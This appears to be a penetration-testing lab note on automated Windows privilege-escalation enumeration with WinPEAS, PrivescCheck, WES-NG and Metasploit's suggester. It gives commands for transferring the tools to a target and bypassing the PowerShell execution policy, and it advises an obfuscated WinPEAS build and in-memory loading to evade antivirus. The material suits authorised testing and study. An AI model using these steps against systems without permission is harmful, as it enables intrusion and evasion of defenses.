---
type: technique
platform: windows
status: working
fluency: guided
source: lab
updated: 2026-09-03
---

# Windows — Automated Enumeration

Scripts that run the manual checks from [[Windows-Privilege-Escalation]] for you and print the results. They shorten enumeration; they do **not** replace judgement — every one of them misses vectors, and their output is a candidate list, not a finding list.

The split that decides which tool to reach for:

| | Runs on | Sees | Costs |
|---|---|---|---|
| **On-target scanners** — WinPEAS, PrivescCheck | the target | live config: services, ACLs, registry, scheduled tasks, credential files | a file on disk / a process → AV may catch it |
| **Attacker-side suggesters** — WES-NG, MSF suggester | your box | *only* missing patches, from `systeminfo` text | quiet, but blind to every misconfiguration |

None of the four ships with Windows or with Kali. You fetch each once onto your **own** attack box, and the two on-target ones then have to be carried across to the target before they can run at all ([[File-Transfer]]). The download URLs, all pinned to `latest/download/` so they never point at a stale release:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
```

```bash
wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
```

```bash
pipx install wesng || pip install wesng
```

- WinPEAS also ships `winPEASx64_ofs.exe` at the same URL path — an obfuscated build that slips past some signature-based AV; reach for it the moment the plain `.exe` is eaten. `winPEASany.exe` is the .NET-any-CPU build for hosts where you are unsure of the architecture, and `winPEAS.bat` is the last-resort version for a box with no .NET at all.
- `pipx` keeps WES-NG in its own environment so it does not collide with Kali's system Python; plain `pip install wesng` works too. Both put a `wes.py` on your `PATH`.

**[[Security-Terms#^av|AV]]** below means antivirus, the on-target software that inspects files as they are written and processes as they start.

So they are not competitors — they answer different questions. A scanner finds the writable service; a suggester finds the unpatched kernel. Neither sees the other's category.

> [!important] Run `whoami /priv` before any of them
> The single most useful line comes free and instantly: `whoami /priv` prints the privileges in your **token** — the badge Windows stamps on every process you start, carrying your account, your groups and your special rights — and that decides which of the paths in [[Windows-Privilege-Escalation]] is even open. Scanner output is unreadable without that context — you will not know which red highlight matters. Manual first, script second.

## WinPEAS — on-target scanner

**Why now** — you have done the manual pass and want a second opinion that sweeps every category at once: services, ACLs, registry, credential files. You run this to catch what you missed by hand, not instead of the hand pass — running it first buries the one answer in a thousand lines.

```bash
powershell wget http://<your-ip>/winPEASx64.exe -outfile winPEASx64.exe
```

```bash
.\winPEASx64.exe > out.txt
```

- WinPEAS → "Windows Privilege Escalation Awesome Script", one self-contained `.exe` from the [[Security-Terms#^peass|PEASS-ng]] project on GitHub. It runs **on the target** and sweeps misconfigurations, credentials, services and privesc vectors in a single pass.
- getting it there → you already fetched `winPEASx64.exe` onto Kali (the `wget` at the top of this note). Serve the directory it is in with `python3 -m http.server 80`, and `<your-ip>` is your own address on the network the target can reach — `ip a` on Linux, usually the `tun0` interface when you are on a [[Security-Terms#^vpn|VPN]]. Full transfer options: [[File-Transfer]].
- run it from the directory you dropped it in — `.\` means "in the current folder", and PowerShell requires it, because unlike `cmd.exe` it will not run a file from the working directory without being told to.
- `> out.txt` → **always redirect.** The output is long and colour-coded; scrolling it live loses the top of it, and a non-interactive shell strips the colour that marks the findings.

**What you will see**

- **Found** — lines highlighted **red on green** are what WinPEAS rates a probable escalation: a writable service path, a stored credential, an exploitable privilege. Everything else is context it prints so you can judge for yourself.
- **Empty** — WinPEAS run as a low-privilege account reads far less than the same scan as an admin; a short report is a visibility limit, not a clean host. Note what it could **not** read (Access-denied sections) as carefully as what it flagged.
- **Error** — `wget` here is PowerShell's alias for `Invoke-WebRequest`; `-outfile` is its parameter, so this only works inside `powershell`. In plain `cmd` the line errors with `'wget' is not recognized`. If the binary lands but will not run, AV ate it — switch to PrivescCheck below.
- **Noise** — most of the output. WinPEAS cannot see intent, so it flags normal things: stock services, your own writable temp folder, benign registry keys. Colour is the filter.

**Then** — every highlight goes to [[Windows-Privilege-Escalation]] to be validated by hand against the category it belongs to. A flagged service goes to [[Windows-Service-Abuse]]; a flagged credential file to [[Windows-Credential-Harvesting]]. A blocked or empty run sends you to PrivescCheck, which plants no binary.

## PrivescCheck — on-target scanner, PowerShell-native

**Why now** — WinPEAS was caught by AV, or you would rather not drop an `.exe` at all. This covers the same on-target ground as a `.ps1`, so there is no binary to plant and nothing for a file-based scanner to match.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

```powershell
. .\PrivescCheck.ps1
```

```powershell
Invoke-PrivescCheck
```

- PrivescCheck → one PowerShell script file, `PrivescCheck.ps1` (the `wget` at the top of this note fetched it from itm4n's releases onto Kali). It runs **on the target** and covers the same ground as WinPEAS with no `.exe` to plant; carry it across the same way ([[File-Transfer]]). Because it is a `.ps1`, you can also skip the file entirely and run it straight from memory — see the `DownloadString` load in [[File-Transfer]], which never writes it to disk for AV to find.
- `Set-ExecutionPolicy Bypass` → the **execution policy** is PowerShell's own setting for which script files it is willing to run, and by default it refuses unsigned `.ps1` files. It is a rail against accidents rather than a security boundary, and this line lowers it. `-Force` answers the yes/no confirmation prompt for you, which matters because a non-interactive shell cannot type an answer and would hang instead.
- `-Scope Process` → the bypass dies with this shell; it does not touch the machine-wide policy, so it is the quiet way to run an unsigned script. Omit it and you either fail to change the policy (as a non-admin) or leave a machine-wide change behind (as an admin) — both wrong.
- `. .\PrivescCheck.ps1` → the leading dot is **dot-sourcing**: it runs the file in the current session so its functions stick around to be called. Without the dot the script runs in a child scope and `Invoke-PrivescCheck` is gone the moment it returns — `The term ... is not recognized`.
- Add `-Extended` for more checks, or `-Report out -Format HTML,TXT` to write a report out.

**What you will see**

- **Found** — each check prints a result with a severity; anything above `Info` is a candidate. It groups by category, so a `High` under "Services" or "Credentials" points you at the same vector WinPEAS would have.
- **Empty** — all checks returning `None`/`Info` as a low-privilege account is, again, a visibility limit first and a clean host second. Re-run after any escalation.
- **Error** — `File ... cannot be loaded because running scripts is disabled` means the `Set-ExecutionPolicy` line did not take; you are in a context that outranks `-Scope Process`: **Constrained Language Mode** (a PowerShell lockdown that permits only a small subset of the language) or a policy pushed by **Group Policy** ([[Security-Terms#^gpo|GPO]] — configuration an administrator applies centrally across a domain, which beats anything you set locally). **[[Security-Terms#^amsi|AMSI]]** (Antimalware Scan Interface, the hook that lets Defender read a script's text before PowerShell executes it) blocking the load is the other cause — the script never even parses.
- **Noise** — the `Info`-level checks are inventory, not findings. Read the severity column, not every line.

**Then** — same as WinPEAS: each real result is validated in [[Windows-Privilege-Escalation]]. If both scanners are blocked on this host, fall back to the attacker-side suggesters below, which run nothing on the target at all.

## WES-NG — attacker-side patch suggester

**Why now** — the scanners found no misconfiguration, or you cannot run one without tripping AV, and the remaining question is the kernel: is the OS missing a patch you can exploit? This runs on **your** box, so nothing lands on the target, and answers only that question.

```bash
wes.py --update          # refresh the CVE/patch database FIRST
```

```bash
wes.py systeminfo.txt
```

The input is the target's `systeminfo` output, saved to a file and carried back to your box:

```cmd
systeminfo > systeminfo.txt
```

- WES-NG → "Windows Exploit Suggester – Next Generation", a Python script that runs **on your attack box** (`pip install wesng`, or clone the `bitsadmin/wesng` repository). It never touches the target; it only reads a text file you carried back from it.
- `--update` is not optional — a stale database misses recent patches and reports fixed bugs as open, so you waste time on CVEs the host is immune to. Run it before every real use.
- It reads the **Hotfix(s)** list in `systeminfo`. If that section is empty or truncated (some hardened builds hide it), WES-NG assumes nothing is patched and floods you with false positives.

**What you will see**

- **Found** — a list of **CVE** identifiers (Common Vulnerabilities and Exposures: the public catalogue's unique id for one bug, in the form `CVE-2021-1732`), each with the missing **KB** number — the Microsoft patch that fixes it — an impact, and often an exploit link. The useful lines are the ones marked with a public exploit; a bare CVE with no **[[Security-Terms#^poc|PoC]]** (proof of concept — working exploit code somebody has actually published) is a lead, not a weapon.
- **Empty** — "no vulnerabilities were found" means the OS is **patched**, not that the box is safe: WES-NG never looked at services, ACLs, or credentials. Empty here sends you back to the scanner categories, not off the host.
- **Error** — WES-NG choking on `systeminfo.txt` is almost always encoding: a `systeminfo` redirected from a non-English or [[Security-Terms#^utf16|UTF-16]] console needs converting first. `KB` list empty → regenerate `systeminfo` in a full console, not a stripped shell.
- **Noise** — the raw list is long and over-reports. Superseded patches make many entries already-fixed; trust the exploit-available column over the row count.

**Then** — a CVE with a public exploit goes to [[Public-Exploit-Workflow]] and to [[Vulnerable-Software]] if it is third-party rather than the OS. Nothing missing means the patch route is closed and the escalation is a misconfiguration — back to the scanner output and [[Windows-Privilege-Escalation]].

## Metasploit — local_exploit_suggester

**Why now** — you already have a Meterpreter session and want the same missing-patch question answered without exporting `systeminfo` by hand. **Metasploit** is an exploitation framework that runs on your attack box; **Meterpreter** is its own payload — a shell with extra built-in commands that calls home and appears as a numbered *session*; and a `post/` module is one that runs against a session you already hold rather than one that breaks in. The suggester ranks Metasploit's own local exploits against that session's fingerprint.

```text
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

- `set SESSION <id>` → the numeric id from `sessions -l`, which lists every session you currently hold with its number — not the target IP. A wrong or dead session id is the usual reason it returns nothing.

**What you will see**

- **Found** — modules marked `Appears to be vulnerable`. Those are the ones with a matching [[Security-Terms#^msf|MSF]] exploit ready to `use`.
- **Empty** — same meaning as WES-NG empty (patched, or the fingerprint was thin), but narrower: it only ever considered exploits **Metasploit ships a module for**, a shorter view of the world than WES-NG's database.
- **Error** — `The session has died` or `Post failed` means the Meterpreter session dropped; re-establish it before re-running.
- **Noise** — modules marked `Cannot reliably check` are guesses, not hits; verify the target version by hand before spending an attempt.

**Then** — a vulnerable module goes to [[Public-Exploit-Workflow]] for the verify-before-fire step. An empty list, because this view is the narrowest, is a reason to run WES-NG as well before concluding the OS is patched.

## Rarely — worth one command, not worth a step

**Why now** — the scanner above will not run, or it ran and was killed before it finished. Both have the same cause and the same one-command answer.

```powershell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -outfile wp.exe
```

- The obfuscated build exists for exactly one reason: the normal one is detected by name and by signature on any host with live protection. Same scanner, same output, different bytes.
- If this one is stopped too, the answer is not another download. Run the checks by hand from [[Windows-Run-Sheet]] instead, which is why that sheet exists.

**What you will see**

- **Found** — the scanner runs to completion and writes its output.
- **Empty** — the normal answer here is that this section is not needed at all, because the standard build ran.
- **Error** — a download that completes and then the file disappears is protection deleting it after the write, not a failed transfer. A refused download is a network or proxy problem instead, and those need [[File-Transfer]].
- **Noise** — a scanner that starts, prints its banner and stops is being terminated, not crashing. The banner proves the file reached the disk intact.

**Then** — a completed run goes back to the reading section below. A second block means stop fighting the scanner and work the run sheet by hand.

## Reading the output

Two habits separate a useful scanner run from a wasted hour.

Highlights are **hypotheses, not vulnerabilities.** Chasing them top-to-bottom without the `whoami /priv` filter is how the hour vanishes — you validate each one by hand against the category it belongs to in [[Windows-Privilege-Escalation]], and most do not survive.

**A short report is about your token, not the host.** A scanner run as a low-privilege account cannot read the services, registry keys and scheduled tasks where the findings live — the same scan as a more privileged user often looks completely different. Record what each tool could not read, and run every one of them again after any escalation.

## Next

- [[Windows-Privilege-Escalation]] — the manual category checklist these tools feed, and the `whoami /priv` context that makes the output readable
- [[Vulnerable-Software]] — a suggester flags a *missing OS patch*; this is the sibling check for vulnerable *third-party* software the suggester cannot see
- [[Windows-Credential-Harvesting]] — the credential files a scanner points at but will not loot
- [[File-Transfer]] — how the binary reaches the target

## Gaps

- No note on defeating AV/AMSI when a scanner or `.ps1` is flagged on write or on run — the whole reason WES-NG exists, but the evasion techniques themselves (obfuscation, AMSI bypass) are uncovered.
- WES-NG's output still needs the [[Public-Exploit-Workflow]] treatment to become a working exploit; the tool names the CVE, it does not weaponise it.
